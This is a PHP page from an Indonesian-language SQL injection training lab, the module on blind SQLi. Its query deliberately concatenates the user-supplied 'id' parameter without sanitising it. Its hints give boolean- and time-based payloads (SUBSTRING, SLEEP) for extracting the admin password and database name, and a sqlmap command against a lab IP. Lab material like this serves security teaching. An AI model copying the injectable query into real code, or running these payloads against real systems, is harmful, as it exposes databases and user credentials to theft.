<?php
// blind/index.php — Modul 3: Blind / Logic-Based SQLi

require_once '../includes/db.php';

$conn = getDB();
$message = '';
$message_type = '';
$response_time = 0;

$user_id = isset($_GET['id']) ? $_GET['id'] : '';

if ($user_id !== '') {
    $start = microtime(true);

    // ❌ VULNERABLE: Blind injection — tidak ada output data, hanya TRUE/FALSE
    $query = "SELECT id FROM users WHERE id='$user_id' LIMIT 1";

    $result = $conn->query($query);

    $end = microtime(true);
    $response_time = round(($end - $start) * 1000, 2); // ms

    if ($result && $result->num_rows > 0) {
        $message = "✅ User ditemukan (kondisi TRUE)";
        $message_type = 'success';
    } elseif ($conn->error) {
        // Sembunyikan error untuk blind scenario
        $message = "⚠️ Terjadi kesalahan sistem.";
        $message_type = 'warning';
    } else {
        $message = "❌ User tidak ditemukan (kondisi FALSE)";
        $message_type = 'danger';
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Blind SQLi — Lab SQLi</title>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
        .response-meter {
            background: #0a0a15;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 15px;
        }
        .response-meter .time {
            font-size: 2rem;
            font-weight: bold;
            color: #a8ff78;
        }
        .response-meter .time.slow { color: #e94560; }
        .extraction-table { font-size: 0.82rem; }
        .bit-indicator {
            display: inline-block;
            width: 18px; height: 18px;
            border-radius: 3px;
            margin: 2px;
            text-align: center;
            font-size: 0.7rem;
            line-height: 18px;
        }
        .bit-true  { background: #1a472a; color: #a8ff78; }
        .bit-false { background: #4a0010; color: #e94560; }
        .bit-unknown { background: #333; color: #666; }
    </style>
</head>
<body>

<nav class="navbar">
    <a class="brand" href="/">🔐 Lab<span>SQLi</span></a>
    <div class="nav-links">
        <a href="/">Home</a>
        <a href="/basic/">Basic</a>
        <a href="/auth/">Auth Bypass</a>
        <a href="/blind/" class="active">Blind SQLi</a>
    </div>
</nav>

<div class="page-header">
    <h1>🕶️ Modul 3 — Blind SQL Injection</h1>
    <p>Tidak ada data yang ditampilkan. Hanya TRUE atau FALSE. Gunakan logika untuk mengekstrak data.</p>
</div>

<div class="lab-container">

    <!-- Penjelasan -->
    <div class="lab-box">
        <h2>📚 Apa itu Blind SQLi?</h2>
        <p style="color:#aaa; font-size:0.88rem; line-height:1.7;">
            Berbeda dengan SQLi biasa, blind injection <strong style="color:white">tidak menampilkan data</strong> dari query.
            Aplikasi hanya merespons dengan <span style="color:#a8ff78">TRUE</span> (data ditemukan) atau
            <span style="color:#e94560">FALSE</span> (tidak ditemukan).
            <br><br>
            Kamu harus mengajukan pertanyaan yes/no berulang kali untuk mengekstrak informasi
            — mirip seperti bermain <em>20 questions</em> dengan database.
        </p>
    </div>

    <!-- Input -->
    <div class="lab-box">
        <h2>👤 Cek User berdasarkan ID</h2>
        <form method="GET" action="/blind/">
            <div class="form-group">
                <label>User ID:</label>
                <input type="text" name="id"
                       value="<?= sanitize($user_id) ?>"
                       placeholder="1  atau  1' AND 1=1-- -">
            </div>
            <button type="submit" class="btn btn-primary">Cek</button>
            <a href="/blind/" style="margin-left:10px; color:#666; font-size:0.85rem;">Reset</a>
        </form>
        <p style="margin-top:10px; font-size:0.8rem; color:#666;">
            ℹ️ Output hanya: "ditemukan" atau "tidak ditemukan" + response time.
        </p>
    </div>

    <?php if ($user_id !== ''): ?>

    <!-- Response Time Meter -->
    <div class="response-meter">
        <div style="font-size:0.8rem; color:#666; margin-bottom:4px;">⏱️ Response Time:</div>
        <div class="time <?= $response_time > 2000 ? 'slow' : '' ?>">
            <?= $response_time ?> ms
            <?= $response_time > 2000 ? '⚠️ DELAY TERDETEKSI!' : '' ?>
        </div>
        <div style="font-size:0.75rem; color:#555; margin-top:4px;">
            Normal: &lt;100ms | Time-based injection: &gt;3000ms
        </div>
    </div>

    <!-- Response -->
    <div class="alert alert-<?= $message_type ?>" style="font-size:1.1rem; text-align:center; padding:20px;">
        <?= $message ?>
    </div>

    <!-- Query yang dieksekusi (semi-hidden untuk tidak terlalu mudah) -->
    <details>
        <summary style="cursor:pointer; color:#555; font-size:0.8rem; margin-bottom:10px;">
            🔍 Lihat query yang dieksekusi (spoiler!)
        </summary>
        <div class="query-display">
            SELECT id FROM users WHERE id='<?= sanitize($user_id) ?>' LIMIT 1
        </div>
    </details>

    <?php endif; ?>

    <!-- Teknik Extraction -->
    <div class="lab-box">
        <h2>🎯 Objektif & Teknik</h2>

        <div style="margin-bottom:20px;">
            <p style="color:#f7971e; font-size:0.9rem; font-weight:bold; margin-bottom:8px;">Teknik Boolean-Based:</p>
            <p style="color:#aaa; font-size:0.85rem;">Ajukan pertanyaan yang jawabannya true/false:</p>
            <div class="query-display" style="margin-top:8px;">
                -- Apakah karakter pertama password admin adalah 'a'?<br>
                1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -<br><br>
                -- Apakah panjang password admin lebih dari 5?<br>
                1' AND LENGTH((SELECT password FROM users WHERE username='admin'))>5-- -
            </div>
        </div>

        <div>
            <p style="color:#e94560; font-size:0.9rem; font-weight:bold; margin-bottom:8px;">Teknik Time-Based:</p>
            <p style="color:#aaa; font-size:0.85rem;">Gunakan SLEEP() untuk konfirmasi kondisi:</p>
            <div class="query-display" style="margin-top:8px;">
                -- Jika kondisi TRUE, delay 3 detik<br>
                1' AND IF(1=1, SLEEP(3), 0)-- -<br><br>
                -- Cek apakah nama database dimulai dengan 'l'<br>
                1' AND IF(SUBSTRING(database(),1,1)='l', SLEEP(3), 0)-- -
            </div>
        </div>
    </div>

    <!-- Hints -->
    <div class="lab-box">
        <h2>💡 Hints</h2>

        <details class="hint-box">
            <summary>Hint 1 — Konfirmasi Blind SQLi</summary>
            <p>Masukkan ID valid (misal: <code>1</code>) → TRUE.<br>
            Lalu coba: <code>1' AND 1=1-- -</code> → harusnya TRUE.<br>
            Lalu: <code>1' AND 1=2-- -</code> → harusnya FALSE.<br>
            Jika berbeda, injection berhasil!</p>
        </details>

        <details class="hint-box" style="margin-top:10px;">
            <summary>Hint 2 — Cari nama database</summary>
            <p>Gunakan <code>database()</code> untuk mendapat nama DB:<br>
            <code>1' AND SUBSTRING(database(),1,1)='l'-- -</code><br>
            Jika TRUE, karakter pertama adalah 'l'. Lanjut ke karakter ke-2, dst.</p>
        </details>

        <details class="hint-box" style="margin-top:10px;">
            <summary>Hint 3 — Ekstrak password admin</summary>
            <p>Setelah konfirmasi injection:<br>
            <code>1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -</code><br>
            Ulangi untuk setiap karakter sampai mendapat password lengkap.</p>
        </details>

        <details class="hint-box" style="margin-top:10px;">
            <summary>Hint 4 — Automasi dengan script</summary>
            <p>Melakukan manual extraction sangat lambat. Dalam praktik nyata gunakan:<br>
            <code>sqlmap -u "http://172.23.4.212:8080/blind/?id=1" --technique=BT --dbs</code><br>
            Tapi coba dulu secara manual untuk memahami konsepnya!</p>
        </details>

    </div>

    <!-- Challenge Flags -->
    <div class="lab-box">
        <h2>🚩 Challenges</h2>
        <ol style="margin-left:20px; color:#aaa; font-size:0.88rem; line-height:2;">
            <li>Temukan nama database saat ini</li>
            <li>Temukan nama tabel yang ada di database</li>
            <li>Ekstrak username dan password dari tabel users</li>
            <li>Gunakan time-based untuk konfirmasi data tersembunyi di tabel <code style="color:#a8ff78">flags</code></li>
        </ol>
    </div>

</div>

<footer>
    Lab SQLi — <span>Hanya untuk keperluan edukasi</span>
</footer>

</body>
</html>
